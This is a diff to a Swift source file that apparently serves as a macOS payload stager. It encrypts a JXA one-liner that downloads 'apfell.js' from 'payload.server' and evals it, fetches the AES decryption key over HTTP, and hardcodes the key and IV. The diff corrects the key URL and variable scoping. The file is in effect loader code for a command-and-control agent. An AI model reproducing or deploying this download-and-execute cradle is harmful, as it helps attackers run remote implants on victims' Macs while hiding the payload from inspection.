@@ -1,9 +1,11 @@
 import Foundation
 
-let key256   = "12345678901234561234567890123456"   // 32 bytes for AES256
 let iv       = "abcdefghijklmnop"                   // 16 bytes for AES128
 
 func encryptPayload() -> Void {
+    
+    let key256 = "12345678901234561234567890123456"   // 32 bytes for AES256
+
     let cleartext =
     ##"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString("http://payload.server/apfell.js")), $.NSUTF8StringEncoding)));"##
 
@@ -24,12 +26,14 @@ func decryptPayload() -> Void {
     let ciphertext = Data(base64Encoded: encoded_ciphertext)!
     
     //fetch a value over HTTP
-    let url = "http://payload.server/key/txt"
+    let url = "http://payload.server/key.txt"
     
-    
+    var key256 = ""
     let http = HTTPReq()
     do {
-         var key256 = try http.synchronous_request(url: url)
+        key256 = try http.synchronous_request(url: url)
+        key256 = (key256 as NSString).trimmingCharacters(in: NSCharacterSet.whitespacesAndNewlines)
+        
     } catch {
         print("Error fetching key: \(error)")
     }
